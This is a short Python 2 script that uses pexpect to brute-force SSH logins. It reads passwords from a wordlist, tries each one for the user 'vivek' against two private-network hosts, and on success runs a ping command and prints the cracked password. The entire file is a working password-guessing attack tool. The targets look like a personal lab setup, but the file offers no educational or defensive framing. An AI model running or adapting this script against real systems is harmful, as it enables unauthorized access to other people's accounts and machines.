import pexpect
import sys

def attack_ssh(user,host,passwd,cmd):
   print "Testing --",passwd
   print "Test conducting for ",host," ",user
   ssh_string = user+"@"+host+"'s password:"
   con_str = "ssh "+host
   ssh = pexpect.spawn(con_str)
   return_val = ssh.expect([ssh_string],10000)
   if return_val == 0:
      ssh.sendline(passwd)
      login_attempt = ssh.expect(['Permission denied, please try again.','vivek_vm_linux'],60)
      if login_attempt == 0:
         ssh.close()
         return False
      if login_attempt == 1:
         ssh.sendline(cmd)
         ssh.expect(['packets transmitted'],60)
         print ssh.before
         ssh.close()
         return True
   else:
      ssh.close()
      return False
			
def main():
   host = ["192.168.59.129","192.168.59.132"]
   user = ["vivek"]
   for h in host:
      words = open("wordlist.txt","r")
      cmd = "ping -c 5 192.168.59.1"
      usr = user[0]
      for line in words.readlines():
         passwd = line.strip()
         ssh_con = attack_ssh(usr,h,passwd,cmd)
         if(ssh_con):
            print "connection made successfully and password cracked ..",passwd
            break
      words.close()

if __name__ == '__main__':
    main()
